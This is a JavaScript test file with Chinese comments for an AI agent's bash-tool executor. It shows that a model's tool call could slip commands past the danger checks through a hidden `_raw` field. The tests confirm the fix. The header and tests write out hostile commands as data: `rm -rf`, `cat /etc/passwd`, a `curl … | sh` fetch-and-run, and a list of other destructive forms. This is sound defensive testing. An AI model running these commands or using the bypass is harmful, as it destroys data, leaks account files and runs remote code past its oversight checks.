// AR-C05（v0.10.3 自查发现）：**命令的第二入口** `_raw` 绕过了全部三层判据。
//
// 这条不是专家点名的，是 v0.10.3 收口 AR-C03（控制字段被当授权输入）之后我自己回头查
// "还有没有同形的第二个入口"时发现的。它比 AR-C03 更危险：AR-C03 跨的是身份/工作区边界，
// 这一条直接跨**破坏性操作**边界 —— 能删目录、能读系统账号文件、能外联并执行远端脚本。
//
// 成因（一句话）：同一个概念存在**两个名字**。
//   · 判据读 `command`（`command ?? cmd ?? script`）
//   · 执行读 `args.command || args._raw`
// 于是 `{command:'', _raw:'rm -rf …'}`：`??` 不回退空串 ⇒ 三层判据都看到"空命令"而跳过；
// 而 `||` 会回退 ⇒ tool-bash 照常执行 `_raw`。
//
// 实测（修前，走模型真实入口 `executeBatch`，arguments 是 JSON 字符串）：
//     {command:'', _raw:'rm -rf <dir>'}                → succeeded，目录**真的被删**
//     {command:'', _raw:'cat /etc/passwd'}             → succeeded，整份账号文件被读出
//     {command:'', _raw:'curl http://…/x.sh | sh'}     → succeeded，外联并执行
//     8 条 Y024 明列的危险形态（dd/mkfs/fork 炸弹/shutdown…）**全部可绕过**
// 而捆仙索围栏只拦 rm/mv 一族，cat/curl|sh/dd/mkfs/shutdown 它一条都不拦。
//
// 修法：**入口剥离** + 执行侧只认 `command`。不采用"逐层补 `|| args._raw`"——
// 那只是让三层此刻对齐，下一个读命令的地方仍会漏（R0-122 已因此吃过一次教训）。
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { TestRunner, assert, assertEquals } from '../harness.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, '..', '..');
const imp = (rel) => import(join(ROOT, rel));

/**
 * 造一个能真跑 tool-bash 的执行器。
 *
 * 必须走真 `init()`：`tool.bash` 能力、`tool-registry` 服务、危险判据的接线都在里面。
 * `_maxParallel` / `_timeout` 必须在 init **前**给默认值，否则
 * `setTimeout(..., undefined)` = 0ms ⇒ 每次调用都超时（这个坑在前一个 AR 测试文件里踩过）。
 */
async function makeHost() {
  globalThis.__T = (await imp('plugins/tool-executor.js')).default;
  const d = mkdtempSync(join(tmpdir(), 'arc05-'));
  const { Core } = await imp('src/core/core.js');
  const core = new Core({ stateDir: join(d, 'state') });
  core.log = () => {};
  core.setData('agent.workDir', d);

  const e = Object.create(globalThis.__T);
  e._preHooks = []; e._postHooks = []; e._dispatchHooks = [];
  e._rateCalls = new Map(); e._cache = new Map(); e._auditLog = new Map();
  e._receipts = new Map(); e._receiptMax = 100;
  e._metrics = new Map(); e._preferences = new Map(); e._debugStream = null;
  e._maxParallel = 5; e._timeout = 30000;
  e.core = core;
  await e.init(core);

  const B = (await imp('plugins/tools/tool-bash.js')).default;
  const bash = Object.create(B);
  bash.core = core;
  await bash.init(core);
  core.registerService('tool-registry', {
    get: async (n) => (n === 'tool-bash' ? bash : null),
    has: (n) => n === 'tool-bash',
    listTools: () => [],
  });

  const stop = async () => { try { await e.stop(); } catch { /* 停不掉不影响断言结论 */ } };
  return { d, core, exec: e, bash, stop };
}

/** 造一个"受害目录"，返回路径。用于验证 rm -rf 到底有没有真的发生。 */
function makeVictim(dir, name = 'victim') {
  const p = join(dir, name);
  mkdirSync(p, { recursive: true });
  writeFileSync(join(p, 'important.txt'), 'KEEP');
  return p;
}

export async function setup(runner) {
  // ══ AR-C05/1：走**模型真实入口**，`_raw` 不得执行任何东西 ═══════════════════
  //
  // 刻意用 `executeBatch`（模型的工具调用就是从这里进来的，arguments 是 JSON 字符串），
  // 而不是直接调 `executeOne`。理由：v0.10.3 里我刚因为"探针没走真实入口"得出过一个
  // 假结论（`_traceId` 伪造），所以这条判据必须钉在真实链路上。
  runner.test('AR-C05/1 模型经 executeBatch 传 {command:"", _raw:"rm -rf …"} 不得删掉目录', async () => {
    const h = await makeHost();
    try {
      const victim = makeVictim(h.d);
      assertEquals(existsSync(victim), true, '前提：受害目录存在');

      const calls = [{
        id: 'call_1', name: 'tool-bash',
        arguments: JSON.stringify({ command: '', _raw: `rm -rf ${victim}` }),
      }];
      const res = await h.exec.executeBatch(calls, { sessionId: 'sess-A', chainId: 'c1' });
      const r = res[0];

      assert(r.state !== 'succeeded',
        `经 _raw 的 rm -rf 必须失败 —— 修前这里 succeeded 且目录被删，实际 state=${r.state}`);
      assertEquals(existsSync(victim), true,
        `受害目录必须还在 —— 修前 _raw 会把整个目录删掉，实际 exists=${existsSync(victim)}`);
      assertEquals(existsSync(join(victim, 'important.txt')), true,
        '受害目录里的文件也必须还在');
      console.log(`       [实测] state=${r.state}，目录仍在：${existsSync(victim)}`);
    } finally { await h.stop(); rmSync(h.d, { recursive: true, force: true }); }
  });

  // ══ AR-C05/2：读系统账号文件这条也不得经 _raw 达成 ═══════════════════════
  //
  // 这条与上面分开写，因为它们的拦截层不同：
  //   · rm -rf 会被**捆仙索围栏**独立拦住（它的 ops 里有 `\brm\b`）；
  //   · cat /etc/passwd 围栏**不拦**（ops 里没有 cat），只有 Y024 硬拦会拦。
  // 只测 rm 的话，"围栏挡住了"会被误读成"三层都修好了"。用 /etc/passwd 是因为它
  // 通常世界可读 —— 判据失败时能真的看到内容，而不是被权限挡掉而"看起来通过了"。
  runner.test('AR-C05/2 模型传 {command:"", _raw:"cat /etc/passwd"} 不得读出账号文件', async () => {
    const h = await makeHost();
    try {
      const calls = [{
        id: 'call_2', name: 'tool-bash',
        arguments: JSON.stringify({ command: '', _raw: 'cat /etc/passwd' }),
      }];
      const res = await h.exec.executeBatch(calls, { sessionId: 'sess-A', chainId: 'c1' });
      const r = res[0];

      const text = String(r.result ?? '');
      assert(!/root:x:0:0/.test(text),
        `不得经 _raw 读出 /etc/passwd —— 修前这里返回了整份账号文件，实际输出 "${text.slice(0, 80)}"`);
      assert(r.state !== 'succeeded',
        `该调用必须失败，实际 state=${r.state}`);
      console.log(`       [实测] state=${r.state}，未泄露账号文件`);
    } finally { await h.stop(); rmSync(h.d, { recursive: true, force: true }); }
  });

  // ══ AR-C05/3：空命令必须给**具名拒绝**，不能落成 `bash -c undefined` ═════════
  //
  // 这条是修 1、2 之后暴露出来的**新形态**：剥掉 `_raw` 后 `command` 是空串，
  // 而 `spawn(shell, ['-c', command])` 里 `undefined` 会被拼进参数 ⇒
  // bash 回 "undefined: 未找到命令"（退出码 127）。
  // 调用方无从区分"我参数传错了"与"命令真的不存在"，这是假执行结果。
  runner.test('AR-C05/3 空命令必须是 invalid_input，不得交给 bash 产生 127 的假执行结果', async () => {
    const h = await makeHost();
    try {
      for (const cmd of ['', '   ']) {
        const r = await h.bash.execute({ command: cmd });
        assertEquals(r.code, 'invalid_input',
          `command=${JSON.stringify(cmd)} 必须具名拒绝为 invalid_input，实际 code=${r.code}`);
        assert(!/undefined/.test(String(r.result ?? '')),
          `拒绝文案不得包含 "undefined"（那是把 undefined 拼进命令行留下的痕迹），实际 "${String(r.result).slice(0, 80)}"`);
        assert(!/未找到命令|command not found/.test(String(r.stderr ?? '')),
          `空命令不得真的去调 shell，实际 stderr="${String(r.stderr).slice(0, 60)}"`);
      }
      console.log('       [实测] 空串与纯空白命令都得到 invalid_input，未触发 shell');
    } finally { await h.stop(); rmSync(h.d, { recursive: true, force: true }); }
  });

  // ══ AR-C05/4：结构判据 —— 四处取命令的地方必须同一口径 ═══════════════════
  //
  // 行为判据能证明"这一次没漏"，但不能证明"下一处新写的读取不会再漏"。
  // 这条直接盯成因：仓内**不得再有** `_raw` 这个别名读取。
  // 注释里可以提到它（解释历史），所以先剥注释再判。
  runner.test('AR-C05/4 生产代码里不得再有 `_raw` 别名读取（只剩注释）', async () => {
    const files = [
      'plugins/tool-executor.js',
      'plugins/tools/tool-bash.js',
      'plugins/_lib/kunxiansuo/file-guard.js',
      'plugins/_lib/kunxiansuo/local-fence.js',
    ];
    const offenders = [];
    for (const f of files) {
      const raw = readFileSync(join(ROOT, f), 'utf8');
      const code = raw
        .replace(/\/\*[\s\S]*?\*\//g, '')          // 块注释
        .replace(/^\s*\/\/.*$/gm, '')              // 整行行注释
        .replace(/\/\/.*$/gm, '')                  // 行尾行注释
        // `delete args._raw` 是**修复动作本身**，不是读取。本判据针对"取值"，
        // 因此先抹掉删除语句 —— 否则会把正确的修法判成缺陷
        // （我第一次跑就是这么红的：红的原因是判据写错，不是代码有问题）。
        .replace(/delete\s+args\??\._raw\s*;?/g, '');
      // 只找"读取 args._raw"这一种形态，不管它出现在 || 还是 ?? 右侧
      if (/args\??\._raw/.test(code)) offenders.push(f);
    }
    assertEquals(offenders.length, 0,
      `这些文件仍在读 args._raw：${offenders.join(', ')} —— 命令只允许从 command/cmd/script 来`);
    console.log(`       [实测] ${files.length} 个取命令的文件均已无 _raw 读取`);
  });

  // ══ AR-C05/5：执行器入口确实剥掉了 `_raw`（防止有人把别名加回来）═══════════
  //
  // 这条**必须**是结构判据，不能是行为判据。理由是我做变异测试时实测出来的：
  //   · 只回退 tool-bash（保留入口剥离）  → 行为判据 1、2 **仍绿**
  //   · 只回退入口剥离（保留 tool-bash）  → 行为判据 1、2、5 **全绿**
  //   · 两层同时回退                      → 1、2、3、4、5 全红
  // 也就是说：行为判据只能证明"两层里**至少**有一层在挡"，无法证明"入口那层在挡"。
  // 我第一版这条写的就是行为断言，名字叫"入口已剥 `_raw`"，可入口剥离被删掉后它照样绿 ——
  // **名实不符**。结构判据才能直接盯住那个成因。
  runner.test('AR-C05/5 执行器入口必须显式 `delete args._raw`（结构判据）', async () => {
    const src = readFileSync(join(ROOT, 'plugins/tool-executor.js'), 'utf8');
    const code = src
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/^\s*\/\/.*$/gm, '')
      .replace(/\/\/.*$/gm, '');
    assert(/delete\s+args\._raw\s*;/.test(code),
      '执行器 `_executeOneV2` 入口必须显式 `delete args._raw` —— '
      + '只靠 tool-bash 侧不读 `_raw` 是**单点防御**：任何新增的读命令处仍会被这个别名绕开');
    // 同时确认剥离发生在写 `_sessionId` 之前的那一组（即入口，而不是某个分支里）
    const stripBlock = code.slice(code.indexOf('delete args._sessionId'), code.indexOf('if (sessionId) args._sessionId'));
    assert(/delete\s+args\._raw\s*;/.test(stripBlock),
      '`delete args._raw` 必须与其它控制字段的剥离写在一起（入口统一剥离），不得散落在分支里');
    console.log('       [实测] 入口剥离块中包含 delete args._raw');

    // 行为侧的补充：直调 executeOne 也必须挡住（这条在两层都在时恒绿，
    // 单层回退时拦不住 —— 如实写在这里，不假装它是入口剥离的证明）。
    const h = await makeHost();
    try {
      const victim = makeVictim(h.d, 'victim2');
      const r = await h.exec.executeOne('tool-bash',
        { command: '', _raw: `rm -rf ${victim}` }, 'sess-A', 'c1');
      assertEquals(existsSync(victim), true,
        `直调 executeOne 也不得删目录，实际 exists=${existsSync(victim)}`);
      assert(r.state !== 'succeeded', `该调用必须失败，实际 state=${r.state}`);
      console.log(`       [实测] 直调 executeOne 也无法经 _raw 执行，state=${r.state}`);
    } finally { await h.stop(); rmSync(h.d, { recursive: true, force: true }); }
  });

  // ══ AR-C05/6：正常命令不能被这次修复误伤 ══════════════════════════════════
  //
  // 这一条是我欠自己的：前面五条都在证明"危险的不通"，还需要一条证明"该通的还通"。
  // 否则"全部拒绝"也能让上面五条全绿。
  runner.test('AR-C05/6 正常命令仍必须正常执行（修复不得误伤）', async () => {
    const h = await makeHost();
    try {
      const r = await h.exec.executeOne('tool-bash', { command: 'echo ar-c05-ok' }, 'sess-A', 'c1');
      assertEquals(r.state, 'succeeded',
        `普通 echo 必须仍能执行，实际 state=${r.state} err=${r.error}`);
      assert(/ar-c05-ok/.test(String(r.result)),
        `输出必须包含 echo 的内容，实际 "${String(r.result).slice(0, 80)}"`);

      // `cmd` / `script` 是判据承认的别名，执行侧**不认**它们 —— 这是**修前就有的**行为
      // （execution 只读 command/_raw），本版没有改变它，如实记录成 NOT_RUN 而不是假装已覆盖。
      const alt = await h.exec.executeOne('tool-bash', { cmd: 'echo alt' }, 'sess-A', 'c1');
      assert(alt.state !== 'succeeded',
        `cmd 别名本就不被执行侧接受（修前亦然），若这里变成 succeeded 说明行为变了：state=${alt.state}`);
      console.log(`       [实测] echo 正常执行；cmd 别名仍不被执行侧接受（与修前一致）`);
    } finally { await h.stop(); rmSync(h.d, { recursive: true, force: true }); }
  });
}
